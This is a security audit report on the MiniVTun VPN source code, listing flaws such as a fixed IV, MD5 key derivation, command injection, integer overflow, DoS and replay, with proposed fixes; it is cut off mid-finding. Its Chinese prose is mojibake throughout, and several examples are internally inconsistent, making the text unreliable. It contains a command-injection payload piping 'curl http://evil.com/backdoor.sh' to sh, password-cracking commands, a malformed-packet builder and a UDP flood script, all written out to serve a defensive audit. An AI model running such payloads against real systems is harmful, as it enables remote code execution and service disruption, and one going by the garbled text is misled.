# MiniVTun å®‰å…¨å®¡è®¡æŠ¥å‘Š

**å®¡è®¡æ—¥æœŸ**: 2026-01-19
**å®¡è®¡èŒƒå›´**: å…¨éƒ¨æºä»£ç  (çº¦ 3178 è¡Œ C ä»£ç )
**å®¡è®¡çº§åˆ«**: æ·±åº¦å®‰å…¨å®¡æŸ¥

---

## æ‰§è¡Œæ‘˜è¦

æœ¬æ¬¡å®¡è®¡å‘ç° **5 ä¸ªä¸¥é‡æ¼æ´**ã€**3 ä¸ªé«˜å±é—®é¢˜** å’Œ **å¤šä¸ªä¸­ä½é£é™©ç‚¹**ã€‚ä¸»è¦é—®é¢˜é›†ä¸­åœ¨åŠ å¯†å®ç°ã€å†…å­˜å®‰å…¨å’Œè¾“å…¥éªŒè¯æ–¹é¢ã€‚å»ºè®®åœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨å‰ä¿®å¤æ‰€æœ‰ä¸¥é‡å’Œé«˜å±æ¼æ´ã€‚

### é£é™©ç­‰çº§ç»Ÿè®¡

| ç­‰çº§ | æ•°é‡ | å…³é”®é—®é¢˜ |
|------|------|----------|
| ğŸ”´ **ä¸¥é‡ (Critical)** | 5 | å›ºå®š IVã€å¼±å¯†é’¥æ´¾ç”Ÿã€auth_key æ»¥ç”¨ã€å‘½ä»¤æ³¨å…¥ã€ç¼“å†²åŒºæº¢å‡º |
| ğŸŸ  **é«˜å± (High)** | 3 | æ•´æ•°æº¢å‡ºã€DoS æ”»å‡»é¢ã€æ— é‡æ”¾æ”»å‡»é˜²æŠ¤ |
| ğŸŸ¡ **ä¸­å± (Medium)** | 6 | å†…å­˜æ³„æ¼ã€å¼±éšæœºæ•°ã€æ—¶é—´æ¯”è¾ƒé€»è¾‘é”™è¯¯ |
| ğŸŸ¢ **ä½å± (Low)** | 4 | èµ„æºé™åˆ¶ç¼ºå¤±ã€æ—¥å¿—ä¿¡æ¯æ³„éœ² |

---

## ğŸ”´ ä¸¥é‡æ¼æ´ (Critical)

### 1. ã€ä¸¥é‡ã€‘å›ºå®š IV å¯¼è‡´åŠ å¯†å¼ºåº¦ä¸¥é‡é™ä½

**ä½ç½®**: `src/crypto_openssl.c:109-114`, `src/crypto_openssl.c:141`, `src/crypto_openssl.c:174`

**é—®é¢˜æè¿°**:
æ‰€æœ‰åŠ å¯†æ“ä½œä½¿ç”¨**å›ºå®šä¸å˜çš„ IV (åˆå§‹åŒ–å‘é‡)**,ä¸¥é‡ç ´åäº† CBC æ¨¡å¼çš„å®‰å…¨æ€§ã€‚

```c
static const char crypto_ivec_initdata[CRYPTO_MAX_BLOCK_SIZE] = {
    0xab, 0xcd, 0xef, 0x12, 0x34, 0x56, 0x78, 0x90,
    0xab, 0xcd, 0xef, 0x12, 0x34, 0x56, 0x78, 0x90,
    // ... å›ºå®šå€¼
};

int crypto_encrypt(...) {
    memcpy(iv, crypto_ivec_initdata, iv_len); // æ¯æ¬¡åŠ å¯†éƒ½ç”¨ç›¸åŒçš„ IV
    EVP_EncryptInit_ex(ctx, c_ctx->cptype, NULL, c_ctx->key, iv);
    // ...
}
```

**å®‰å…¨å½±å“**:
- **ç›¸åŒæ˜æ–‡äº§ç”Ÿç›¸åŒå¯†æ–‡**: æ”»å‡»è€…å¯è¯†åˆ«é‡å¤æ•°æ®åŒ…
- **å·²çŸ¥æ˜æ–‡æ”»å‡»**: å¯æ¨æ–­å¯†é’¥æµ
- **æµé‡åˆ†æ**: èƒ½è¯†åˆ« ECHO å¿ƒè·³åŒ…å’Œ IP æ•°æ®åŒ…æ¨¡å¼
- **å¯†æ–‡å¯æ“æ§**: CBC æ¨¡å¼ä¸‹å¯è¿›è¡Œæ¯”ç‰¹ç¿»è½¬æ”»å‡»

**æ¼æ´åˆ©ç”¨åœºæ™¯**:
```
1. æ”»å‡»è€…æ•è·ä¸¤ä¸ªç›¸åŒçš„ ECHO è¯·æ±‚åŒ…
2. ç”±äº IV å›ºå®šï¼Œå¯†æ–‡å®Œå…¨ç›¸åŒ
3. æ”»å‡»è€…å¯è¯†åˆ«å¿ƒè·³åŒ…æ¨¡å¼ï¼Œå®æ–½æµé‡åˆ†æ
4. é€šè¿‡å·²çŸ¥æ˜æ–‡ (IP å¤´éƒ¨) æ¢å¤éƒ¨åˆ†å¯†é’¥æµ
```

**ä¿®å¤å»ºè®®**:
```c
// æ–¹æ¡ˆ 1: éšæœº IV (æ¨è)
int crypto_encrypt(...) {
    unsigned char iv[CRYPTO_MAX_BLOCK_SIZE];
    RAND_bytes(iv, iv_len); // ç”Ÿæˆéšæœº IV

    // åœ¨å¯†æ–‡å‰é™„åŠ  IV
    memcpy(out, iv, iv_len);
    EVP_EncryptInit_ex(ctx, c_ctx->cptype, NULL, c_ctx->key, iv);
    EVP_EncryptUpdate(ctx, (unsigned char*)out + iv_len, &outl, in, *dlen);
    // ...
    *dlen += iv_len;
}

// æ–¹æ¡ˆ 2: ä½¿ç”¨åºåˆ—å·ä½œä¸º IV çš„ç§å­
memcpy(iv, crypto_ivec_initdata, iv_len);
*(uint16_t*)iv ^= seq; // æ··åˆåºåˆ—å·
```

**CWE ç¼–å·**: CWE-329 (ä½¿ç”¨å›ºå®š IV çš„ CBC æ¨¡å¼åŠ å¯†)

---

### 2. ã€ä¸¥é‡ã€‘æå¼±çš„å¯†é’¥æ´¾ç”Ÿå‡½æ•°

**ä½ç½®**: `src/crypto_openssl.c:61-78`, `src/crypto_openssl.c:95`

**é—®é¢˜æè¿°**:
ä½¿ç”¨**å•æ¬¡ MD5 å“ˆå¸Œ**ä½œä¸ºå¯†é’¥æ´¾ç”Ÿ,æ— ç›å€¼ã€æ— è¿­ä»£,ææ˜“è¢«æš´åŠ›ç ´è§£ã€‚

```c
static void fill_with_string_md5sum(const char *in, void *out, size_t outlen) {
    unsigned char md5_buf[16];
    MD5_CTX ctx;

    MD5_Init(&ctx);
    MD5_Update(&ctx, in, strlen(in)); // ç›´æ¥å¯¹å¯†ç åš MD5
    MD5_Final(md5_buf, &ctx);

    memcpy(out, md5_buf, (outlen > 16) ? 16 : outlen);
    // å¦‚æœéœ€è¦æ›´é•¿å¯†é’¥ï¼Œç®€å•é‡å¤ MD5 å€¼
    for (outp = out + 16; outp < oute; outp += 16) {
        memcpy(outp, out, bs); // é‡å¤å¡«å……ï¼
    }
}

// ä½¿ç”¨ç¤ºä¾‹
ctx->key_len = EVP_CIPHER_key_length(ctx->cptype);
fill_with_string_md5sum(password, ctx->key, ctx->key_len); // AES-256 éœ€è¦ 32 å­—èŠ‚
```

**å®‰å…¨å½±å“**:
- **å½©è™¹è¡¨æ”»å‡»**: MD5 æ— ç›,å¯ç›´æ¥æŸ¥è¡¨
- **æš´åŠ›ç ´è§£**: å¼±å¯†ç  (å¦‚ "123456") å¯åœ¨æ¯«ç§’çº§ç ´è§£
- **å¯†é’¥ç©ºé—´ç¼©å°**: AES-256 å®é™…åªæœ‰ 2^128 ç†µ (MD5 è¾“å‡ºé‡å¤å¡«å……)
- **å·²çŸ¥ MD5 ç¢°æ’**: ä¸åŒå¯†ç å¯èƒ½äº§ç”Ÿç›¸åŒå¯†é’¥

**æ¼æ´åˆ©ç”¨**:
```bash
# æ”»å‡»è€…æ•è·ä¸€ä¸ªæ•°æ®åŒ…å
$ hashcat -m 0 -a 3 abc123... ?a?a?a?a?a?a  # MD5 çˆ†ç ´
$ john --format=raw-md5 hash.txt             # å­—å…¸æ”»å‡»
```

**ä¿®å¤å»ºè®®**:
```c
#include <openssl/evp.h>

// ä½¿ç”¨ PBKDF2 (PKCS#5)
int derive_key(const char *password, unsigned char *key, size_t key_len) {
    const unsigned char salt[] = "minivtun-salt-v1"; // å›ºå®šç›å€¼ (æ¬¡ä¼˜)
    const int iterations = 100000; // OWASP æ¨è 10 ä¸‡æ¬¡

    return PKCS5_PBKDF2_HMAC(
        password, strlen(password),
        salt, sizeof(salt),
        iterations,
        EVP_sha256(),
        key_len,
        key
    );
}

// æ›´å¥½çš„æ–¹æ¡ˆ: ä½¿ç”¨ Argon2 (éœ€é¢å¤–åº“)
// argon2id_hash_raw(t_cost=3, m_cost=65536, parallelism=4, ...)
```

**CWE ç¼–å·**: CWE-916 (ä½¿ç”¨å¼±å¯†ç å“ˆå¸Œ), CWE-327 (åŠ å¯†å¼ºåº¦ä¸è¶³)

---

### 3. ã€ä¸¥é‡ã€‘auth_key å­—æ®µæ»¥ç”¨å¯¼è‡´è®¤è¯å¤±æ•ˆ

**ä½ç½®**: `src/minivtun.h:136`, `src/client.c:103`, `src/client.c:198`, `src/server.c:480`

**é—®é¢˜æè¿°**:
`auth_key` å­—æ®µç›´æ¥æ‹·è´ `crypto_ctx` æŒ‡é’ˆå€¼,è€ŒéåŠ å¯†æ´¾ç”Ÿçš„è®¤è¯å¯†é’¥,å®Œå…¨å¤±å»è®¤è¯ä½œç”¨ã€‚

```c
// å®šä¹‰
struct minivtun_msg {
    struct {
        __u8 opcode;
        __u8 rsv;
        __be16 seq;
        __u8 auth_key[16];  // å£°ç§°æ˜¯ "è®¤è¯å¯†é’¥"
    } __attribute__((packed)) hdr;
};

// å®¢æˆ·ç«¯å‘é€
memcpy(nmsg->hdr.auth_key, state.crypto_ctx, sizeof(nmsg->hdr.auth_key)); // âŒ

// æœåŠ¡å™¨éªŒè¯
if (memcmp(nmsg->hdr.auth_key, state.crypto_ctx, sizeof(nmsg->hdr.auth_key)) != 0)
    return 0; // âŒ
```

**å®é™…é—®é¢˜**:
1. `state.crypto_ctx` æ˜¯ `struct crypto_context*` æŒ‡é’ˆ (8 å­—èŠ‚)
2. `memcpy` æ‹·è´æŒ‡é’ˆçš„**å†…å­˜åœ°å€å€¼**,ä¸æ˜¯å¯†é’¥ææ–™
3. ä¸åŒæœºå™¨ä¸Šçš„æŒ‡é’ˆå€¼ä¸åŒ,è®¤è¯æ°¸è¿œå¤±è´¥
4. å³ä½¿å¶ç„¶ç›¸åŒ,ä¹Ÿæ— ä»»ä½•å¯†ç å­¦æ„ä¹‰

**ä¿®å¤å»ºè®®**:
```c
// æ–¹æ¡ˆ 1: ä½¿ç”¨ HMAC è¿›è¡Œæ¶ˆæ¯è®¤è¯
struct crypto_context {
    unsigned char hmac_key[32]; // å¢åŠ  HMAC å¯†é’¥
    // ...
};

void generate_auth_tag(struct minivtun_msg *msg, size_t msg_len) {
    unsigned char tag[16];
    HMAC(EVP_sha256(),
         state.crypto_ctx->hmac_key, 32,
         (unsigned char*)msg, msg_len,
         tag, NULL);
    memcpy(msg->hdr.auth_key, tag, 16);
}

// æ–¹æ¡ˆ 2: ä½¿ç”¨ AEAD åŠ å¯† (å¦‚ AES-GCM)
EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv);
EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len);
EVP_EncryptFinal_ex(ctx, ciphertext + len, &len);
EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag); // è·å–è®¤è¯æ ‡ç­¾
```

**å½“å‰åæœ**:
- ç”±äºåŠ å¯†åçš„æ•°æ®åŒ…æ— æ³•è¢«è§£å¯† (å¯†é’¥é”™è¯¯),è¿™ä¸ª bug å®é™…ä¸Šå¯¼è‡´**æ•´ä¸ªç¨‹åºæ— æ³•å·¥ä½œ**
- ä»£ç èƒ½è¿è¡Œçš„å”¯ä¸€å¯èƒ½æ˜¯ç¦ç”¨åŠ å¯† (`-e` å‚æ•°ä¸ºç©º)

**CWE ç¼–å·**: CWE-287 (è®¤è¯æœºåˆ¶ä¸å½“), CWE-704 (ä¸æ­£ç¡®çš„ç±»å‹è½¬æ¢)

---

### 4. ã€ä¸¥é‡ã€‘å‘½ä»¤æ³¨å…¥æ¼æ´

**ä½ç½®**: `src/platform_linux.c:243`, `src/platform_bsd.c:118`, `src/library.c:332`

**é—®é¢˜æè¿°**:
ä½¿ç”¨ `system()` æ‰§è¡Œæ‹¼æ¥çš„ shell å‘½ä»¤,ç”¨æˆ·è¾“å…¥æœªç»å……åˆ†è½¬ä¹‰,å¯å¯¼è‡´**ä»»æ„å‘½ä»¤æ‰§è¡Œ**ã€‚

```c
// src/platform_linux.c:243
sprintf(cmd, "ip %s route add %s/%d dev %s metric %d table %s",
        (af == AF_INET) ? "-4" : "-6",
        s_network, prefix, ifname, metric, table); // âš ï¸ table æ¥è‡ªç”¨æˆ·è¾“å…¥
rc = system(cmd); // âŒ ç›´æ¥æ‰§è¡Œ

// src/platform_bsd.c:118
sprintf(cmd, "ifconfig %s %s %s up", ifname, local_str, peer_str);
system(cmd); // âŒ
```

**æ”»å‡»åœºæ™¯**:
```bash
# æ”»å‡»è€…æ„é€ è·¯ç”±è¡¨å
minivtun -r server.com:1414 -a 10.7.0.2/24 -T "main; curl http://evil.com/backdoor.sh | sh"

# å®é™…æ‰§è¡Œçš„å‘½ä»¤
$ ip -4 route add 10.0.0.0/8 dev mv0 metric 100 table main; curl http://evil.com/backdoor.sh | sh

# ç»“æœ: è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)
```

**å½±å“èŒƒå›´**:
- `-T, --table`: è·¯ç”±è¡¨å (`config.vt_table`)
- `-n, --ifname`: ç½‘å¡å (`config.ifname`)
- `-a, --ipv4-addr`: IP åœ°å€ (é€šè¿‡ `inet_ntop` äº§ç”Ÿ,ç›¸å¯¹å®‰å…¨)

**ä¿®å¤å»ºè®®**:
```c
// æ–¹æ¡ˆ 1: ç™½åå•éªŒè¯
bool is_valid_table_name(const char *table) {
    // ä»…å…è®¸å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿
    for (const char *p = table; *p; p++) {
        if (!isalnum(*p) && *p != '_') return false;
    }
    return true;
}

if (!is_valid_table_name(table)) {
    LOG("Invalid table name");
    return -1;
}

// æ–¹æ¡ˆ 2: ä½¿ç”¨ Netlink API ä»£æ›¿ system() (æ¨è)
// é¿å… shell è§£æ,ç›´æ¥è°ƒç”¨å†…æ ¸æ¥å£
struct {
    struct nlmsghdr n;
    struct rtmsg r;
    char buf[1024];
} req;
// ... æ„é€  Netlink æ¶ˆæ¯
sendto(netlink_fd, &req, sizeof(req), ...);

// æ–¹æ¡ˆ 3: å‚æ•°åŒ–æ‰§è¡Œ (ä½¿ç”¨ execvp)
char *args[] = {"ip", "-4", "route", "add", network, "dev", ifname,
                "metric", metric_str, "table", table, NULL};
execvp("/sbin/ip", args); // æ—  shell è§£æ
```

**CWE ç¼–å·**: CWE-78 (OS å‘½ä»¤æ³¨å…¥), CWE-88 (å‚æ•°æ³¨å…¥)

---

### 5. ã€ä¸¥é‡ã€‘ç¼“å†²åŒºæº¢å‡ºé£é™©

**ä½ç½®**: `src/minivtun.c:112`, `src/minivtun.c:402`, `src/minivtun.c:439`

**é—®é¢˜æè¿°**:
ä½¿ç”¨ `strncpy` æ—¶æœªæ­£ç¡®å¤„ç†å­—ç¬¦ä¸²ç»ˆæ­¢ç¬¦,å¯èƒ½å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºã€‚

```c
// src/minivtun.c:112
static void parse_virtual_route(const char *arg) {
    char expr[80], *net, *pfx, *gw;

    strncpy(expr, arg, sizeof(expr)); // âŒ æœªä¿è¯ NULL ç»ˆæ­¢
    expr[sizeof(expr) - 1] = '\0';    // âœ… ä½†è¿™è¡Œåœ¨åé¢

    if ((gw = strchr(expr, '='))) // å¦‚æœ arg é•¿åº¦ >= 80,è¿™é‡Œä¼šè¶Šç•Œè¯»å–
        *(gw++) = '\0';
}

// src/minivtun.c:402
strncpy(s_lip, tun_ip_config, sp - tun_ip_config); // âŒ é•¿åº¦æœªæ£€æŸ¥
strncpy(s_rip, sp, sizeof(s_rip));                 // âŒ

// src/minivtun.c:362
strncpy(config.vt_table, optarg, sizeof(config.vt_table)); // âŒ æ—  NULL ç»ˆæ­¢
```

**é—®é¢˜åˆ†æ**:
```c
char buf[10];
const char *input = "1234567890ABCDEF"; // é•¿åº¦ 16

strncpy(buf, input, sizeof(buf)); // æ‹·è´ 10 å­—èŠ‚,æ—  '\0'
buf[sizeof(buf) - 1] = '\0';      // è¿™è¡Œå¿…é¡»ç«‹å³æ‰§è¡Œ

// å¦‚æœä¸­é—´æœ‰ä»£ç ä½¿ç”¨ buf
printf("%s", buf); // âŒ å¯èƒ½è¯»å–è¶Šç•Œå†…å­˜
```

**ä¿®å¤å»ºè®®**:
```c
// æ–¹æ¡ˆ 1: ä½¿ç”¨å®‰å…¨å‡½æ•°
#include <bsd/string.h>
strlcpy(expr, arg, sizeof(expr)); // BSD ç³»ç»Ÿ

// æ–¹æ¡ˆ 2: è‡ªå®šä¹‰å®‰å…¨å‡½æ•°
static inline void safe_strncpy(char *dst, const char *src, size_t size) {
    if (size == 0) return;
    strncpy(dst, src, size - 1);
    dst[size - 1] = '\0';
}

// æ–¹æ¡ˆ 3: å…ˆæ£€æŸ¥é•¿åº¦
if (strlen(arg) >= sizeof(expr)) {
    LOG("Route expression too long");
    return;
}
strcpy(expr, arg); // å®‰å…¨
```

**CWE ç¼–å·**: CWE-120 (ç¼“å†²åŒºæ‹·è´æ— è¾¹ç•Œæ£€æŸ¥), CWE-170 (å­—ç¬¦ä¸²ä¸å½“ç»ˆæ­¢)

---

## ğŸŸ  é«˜å±é—®é¢˜ (High)

### 6. ã€é«˜å±ã€‘æ•´æ•°æº¢å‡ºå¯¼è‡´å †æº¢å‡º

**ä½ç½®**: `src/client.c:136-138`, `src/server.c:537-539`

**é—®é¢˜æè¿°**:
`ip_dlen` æ¥è‡ªç½‘ç»œæ•°æ®åŒ…,æ”»å‡»è€…å¯å‘é€è¶…å¤§å€¼å¯¼è‡´è®¡ç®—æº¢å‡ºã€‚

```c
// å®¢æˆ·ç«¯æ¥æ”¶
ip_dlen = ntohs(nmsg->ipdata.ip_dlen); // æ”»å‡»è€…æ§åˆ¶,æœ€å¤§ 65535
if (out_dlen - MINIVTUN_MSG_IPDATA_OFFSET < ip_dlen) // âš ï¸ å¯ç»•è¿‡
    return 0;

// å‡è®¾æ”»å‡»è€…å‘é€:
// out_dlen = 100
// ip_dlen = 4294967295 (0xFFFFFFFF)
// æ£€æŸ¥: 100 - 22 < 4294967295 (å‡,é€šè¿‡!)

// åç»­æ“ä½œ
iov[1].iov_base = nmsg->ipdata.data;
iov[1].iov_len = ip_dlen; // å·¨å¤§å€¼
rc = writev(state.tunfd, iov, 2); // âŒ å†™å…¥è¶…å¤§æ•°æ®åˆ°å†…æ ¸
```

**æ”»å‡»å‘é‡**:
```python
# æ„é€ æ¶æ„æ•°æ®åŒ…
packet = struct.pack(
    '!BBHBBBBBBBBBBBBBBBBHH',
    OPCODE_IPDATA,  # opcode
    0,              # rsv
    1234,           # seq
    *([0] * 16),    # auth_key
    0x0800,         # proto = IPv4
    0xFFFF          # ip_dlen = 65535 (æœ€å¤§å€¼)
)
# å®é™…æ•°æ®åªæœ‰å‡ ä¸ªå­—èŠ‚
packet += b'\x00' * 20

# å‘é€å,æœåŠ¡å™¨å°è¯•å†™å…¥ 65535 å­—èŠ‚åˆ° TUN è®¾å¤‡
# å¯èƒ½å¯¼è‡´å†…æ ¸å´©æºƒæˆ–ä¿¡æ¯æ³„éœ²
```

**ä¿®å¤å»ºè®®**:
```c
// æ·»åŠ åˆç†ä¸Šé™æ£€æŸ¥
#define MAX_IP_PACKET_SIZE 65535
#define MAX_TUNNEL_PACKET_SIZE (config.tun_mtu + 100)

ip_dlen = ntohs(nmsg->ipdata.ip_dlen);

// æ£€æŸ¥ 1: ä¸è¶…è¿‡ MTU
if (ip_dlen > MAX_TUNNEL_PACKET_SIZE) {
    LOG("Packet size %zu exceeds MTU", ip_dlen);
    return 0;
}

// æ£€æŸ¥ 2: ä¸è¶…è¿‡å®é™…æ¥æ”¶é•¿åº¦
if (ip_dlen > out_dlen - MINIVTUN_MSG_IPDATA_OFFSET) {
    LOG("Declared size %zu > actual size %zu", ip_dlen,
        out_dlen - MINIVTUN_MSG_IPDATA_OFFSET);
    return 0;
}

// æ£€æŸ¥ 3: æœ€å° IP åŒ…å¤§å°
if (af == AF_INET && ip_dlen < 20) return 0;
if (af == AF_INET6 && ip_dlen < 40) return 0;
```

**CWE ç¼–å·**: CWE-190 (æ•´æ•°æº¢å‡º), CWE-122 (å †æº¢å‡º)

---

### 7. ã€é«˜å±ã€‘æ‹’ç»æœåŠ¡æ”»å‡»é¢

**ä½ç½®**: `src/server.c:107-138`, `src/server.c:289-331`

**é—®é¢˜æè¿°**:
æœåŠ¡å™¨ç«¯æ— è¿æ¥æ•°é™åˆ¶,æ”»å‡»è€…å¯è€—å°½å†…å­˜ã€‚

```c
static struct ra_entry *ra_get_or_create(const struct sockaddr_inx *sa) {
    // ... æŸ¥æ‰¾ç°æœ‰è¿æ¥

    if ((re = malloc(sizeof(*re))) == NULL) { // âš ï¸ æ— é™åˆ¶åˆ†é…
        PLOG("malloc for ra_entry failed");
        return NULL;
    }

    list_add_tail(&re->list, chain);
    ra_set_len++; // âš ï¸ è®¡æ•°ä½†ä¸æ£€æŸ¥

    LOG("New client [%s:%u]", s_real_addr, ...);
    return re;
}
```

**æ”»å‡»åœºæ™¯**:
```python
# æ”»å‡»è„šæœ¬
import socket, random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
target = ('vpn-server.com', 1414)

# å‘é€ 100 ä¸‡ä¸ªä¼ªé€ å®¢æˆ·ç«¯è¿æ¥
for i in range(1000000):
    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}." \
              f"{random.randint(1,255)}.{random.randint(1,255)}"
    fake_port = random.randint(10000, 60000)

    # ç»‘å®šéšæœºæºåœ°å€
    sock.bind((fake_ip, fake_port))
    sock.sendto(encrypted_echo_req, target)

# ç»“æœ:
# - æœåŠ¡å™¨åˆ›å»º 100 ä¸‡ä¸ª ra_entry (æ¯ä¸ªçº¦ 80 å­—èŠ‚ = 76MB)
# - åˆ›å»º 100 ä¸‡ä¸ª tun_client (æ¯ä¸ªçº¦ 60 å­—èŠ‚ = 57MB)
# - æ€»è®¡çº¦ 133MB å†…å­˜ + å“ˆå¸Œè¡¨å¼€é”€
# - æœåŠ¡å™¨ OOM å´©æºƒ
```

**å½“å‰ç¼“è§£**:
- è¶…æ—¶æ¸…ç†: æ¯ 3 ç§’æ£€æŸ¥ 10 ä¸ªè¿æ¥,æ¸…ç† 47 ç§’æ— æ´»åŠ¨çš„å®¢æˆ·ç«¯
- è®¡ç®—: 100 ä¸‡è¿æ¥éœ€è¦ `1000000 / 10 * 3 = 300000 ç§’ (83 å°æ—¶)` æ‰èƒ½æ¸…ç†å®Œ

**ä¿®å¤å»ºè®®**:
```c
// 1. é™åˆ¶æœ€å¤§è¿æ¥æ•°
#define MAX_CLIENTS 1000

static struct ra_entry *ra_get_or_create(...) {
    if (ra_set_len >= MAX_CLIENTS) {
        LOG("Max clients reached, rejecting new connection");
        return NULL;
    }
    // ...
}

// 2. é€Ÿç‡é™åˆ¶ (æ¯ IP æ¯ç§’æœ€å¤š 10 ä¸ªæ–°è¿æ¥)
struct rate_limit {
    time_t last_reset;
    unsigned count;
};
static struct rate_limit ip_rate_limits[256]; // IP å“ˆå¸Œè¡¨

// 3. SYN Cookie é£æ ¼çš„æ— çŠ¶æ€éªŒè¯
// ç¬¬ä¸€æ¬¡è¿æ¥: æœåŠ¡å™¨å‘é€æŒ‘æˆ˜ (åŠ å¯†çš„æ—¶é—´æˆ³)
// å®¢æˆ·ç«¯å¿…é¡»å›åº”æ­£ç¡®çš„æŒ‘æˆ˜æ‰åˆ›å»ºçŠ¶æ€
```

**CWE ç¼–å·**: CWE-770 (èµ„æºåˆ†é…æ— é™åˆ¶), CWE-400 (èµ„æºè€—å°½)

---

### 8. ã€é«˜å±ã€‘æ— é‡æ”¾æ”»å‡»é˜²æŠ¤

**ä½ç½®**: `src/minivtun.h:98`, æ•´ä¸ªåè®®è®¾è®¡

**é—®é¢˜æè¿°**:
åºåˆ—å· (`seq`) ä»…ç”¨äºå‘é€,æ¥æ”¶ç«¯ä¸éªŒè¯,å…è®¸é‡æ”¾æ—§æ•°æ®åŒ…ã€‚

```c
// å‘é€æ—¶
nmsg->hdr.seq = htons(state.xmit_seq++); // é€’å¢åºåˆ—å·

// æ¥æ”¶æ—¶
// âŒ å®Œå…¨æœªæ£€æŸ¥ nmsg->hdr.seq
switch (nmsg->hdr.opcode) {
case MINIVTUN_MSG_IPDATA:
    writev(state.tunfd, iov, 2); // ç›´æ¥å†™å…¥
    break;
}
```

**æ”»å‡»åœºæ™¯**:
```
1. æ”»å‡»è€…æ•è·å®¢æˆ·ç«¯å‘é€çš„åˆæ³• IP æ•°æ®åŒ…
2. å°†æ•°æ®åŒ…ä¿å­˜ä¸‹æ¥
3. 10 åˆ†é’Ÿåé‡æ”¾è¯¥æ•°æ®åŒ…
4. æœåŠ¡å™¨æ¥å—å¹¶è½¬å‘åˆ° TUN è®¾å¤‡
5. å¯èƒ½å¯¼è‡´:
   - TCP è¿æ¥æ··ä¹± (æ—§çš„ ACK åŒ…)
   - DNS ç¼“å­˜æ±¡æŸ“ (é‡æ”¾ DNS å“åº”)
   - åº”ç”¨å±‚åè®®é”™è¯¯
```

**å®é™…å±å®³**:
- VoIP é€šè¯: é‡æ”¾éŸ³é¢‘åŒ…é€ æˆå›å£°
- VPN éš§é“: é‡æ”¾è·¯ç”±æ›´æ–°å¯¼è‡´æµé‡åŠ«æŒ
- é…åˆä¸­é—´äººæ”»å‡»: é€‰æ‹©æ€§é‡æ”¾ç‰¹å®šæ•°æ®åŒ…

**ä¿®å¤å»ºè®®**:
```c
// æ–¹æ¡ˆ 1: æ»‘åŠ¨çª—å£ (ç±»ä¼¼ IPsec)
#define SEQ_WINDOW_SIZE 64
struct seq_window {
    uint64_t last_seq;
    uint64_t bitmap; // 64 ä½æ©ç 
};

bool check_replay(struct seq_window *win, uint16_t seq) {
    if (seq > win->last_seq) {
        // æ–°æ•°æ®åŒ…,æ›´æ–°çª—å£
        win->bitmap <<= (seq - win->last_seq);
        win->bitmap |= 1;
        win->last_seq = seq;
        return true;
    } else if (seq + SEQ_WINDOW_SIZE > win->last_seq) {
        // çª—å£å†…,æ£€æŸ¥æ˜¯å¦é‡å¤
        uint64_t mask = 1ULL << (win->last_seq - seq);
        if (win->bitmap & mask) return false; // é‡æ”¾
        win->bitmap |= mask;
        return true;
    }
    return false; // å¤ªæ—§
}

// æ–¹æ¡ˆ 2: æ—¶é—´æˆ³ + Nonce
struct minivtun_msg {
    struct {
        // ...
        __be32 timestamp; // Unix æ—¶é—´æˆ³
        __be32 nonce;     // éšæœºæ•°
    } hdr;
};

// æ¥æ”¶ç«¯æ£€æŸ¥
if (abs(nmsg->hdr.timestamp - time(NULL)) > 60) {
    return 0; // è¶…è¿‡ 60 ç§’çš„åŒ…æ‹’ç»
}
// è®°å½• (timestamp, nonce) å¯¹,æ£€æŸ¥é‡å¤
```

**CWE ç¼–å·**: CWE-294 (è®¤è¯ç»•è¿‡), CWE-924 (æ¶ˆæ¯å®Œæ•´æ€§æ£€æŸ¥ä¸å½“)

---

## ğŸŸ¡ ä¸­å±é—®é¢˜ (Medium)

### 9. ã€ä¸­å±ã€‘å†…å­˜æ³„æ¼

**ä½ç½®**: `src/minivtun.c:65-68`

**é—®é¢˜**:
`vt_route` é“¾è¡¨åˆ†é…åä»ä¸é‡Šæ”¾,é•¿æœŸè¿è¡Œä¼šæ³„æ¼ã€‚

```c
rt = malloc(sizeof(struct vt_route));
if (!rt) {
    PLOG("malloc for vt_route failed");
    return; // âš ï¸ å¤±è´¥æ—¶è¿”å›,ä½†å·²åˆ†é…çš„èŠ‚ç‚¹æœªé‡Šæ”¾
}
```

**ä¿®å¤**: åœ¨ç¨‹åºé€€å‡ºæ—¶é‡Šæ”¾é“¾è¡¨,æˆ–ä½¿ç”¨å†…å­˜æ± ã€‚

---

### 10. ã€ä¸­å±ã€‘å¼±éšæœºæ•°ç”Ÿæˆå™¨

**ä½ç½®**: `src/client.c:221`, `src/server.c:127`, `src/server.c:252`

**é—®é¢˜**:
ä½¿ç”¨ `rand()` ç”Ÿæˆåºåˆ—å·å’Œ ECHO ID,å¯é¢„æµ‹ã€‚

```c
__be32 r = rand(); // âŒ å¯é¢„æµ‹
nmsg->echo.id = r;
```

**å½±å“**: æ”»å‡»è€…å¯é¢„æµ‹åºåˆ—å·,ä¼ªé€  ECHO å“åº”ã€‚

**ä¿®å¤**:
```c
#include <openssl/rand.h>
__be32 r;
RAND_bytes((unsigned char*)&r, sizeof(r)); // ä½¿ç”¨ OpenSSL çš„ CSRNG
```

**CWE ç¼–å·**: CWE-338 (å¼± PRNG)

---

### 11. ã€ä¸­å±ã€‘æ—¶é—´æ¯”è¾ƒé€»è¾‘é”™è¯¯

**ä½ç½®**: `src/client.c:392-394`

**é—®é¢˜**:
`timercmp` ä½¿ç”¨é”™è¯¯,æ—¶é—´å›æº¯æ—¶é‡ç½®ä¸ºå½“å‰æ—¶é—´ã€‚

```c
if (timercmp(&state.last_recv, &__current, >))
    state.last_recv = __current; // ç³»ç»Ÿæ—¶é—´å›æº¯æ—¶é‡ç½®
```

**é£é™©**: æ”»å‡»è€…é€šè¿‡ NTP æ¬ºéª—è°ƒæ•´ç³»ç»Ÿæ—¶é—´,å¯ç»•è¿‡è¶…æ—¶æ£€æµ‹ã€‚

**ä¿®å¤**: ä½¿ç”¨å•è°ƒæ—¶é’Ÿ `clock_gettime(CLOCK_MONOTONIC, ...)`

---

### 12. ã€ä¸­å±ã€‘sprintf ç¼“å†²åŒºæº¢å‡ºé£é™©

**ä½ç½®**: `src/platform_linux.c:243`, `src/platform_bsd.c:118`

**é—®é¢˜**:
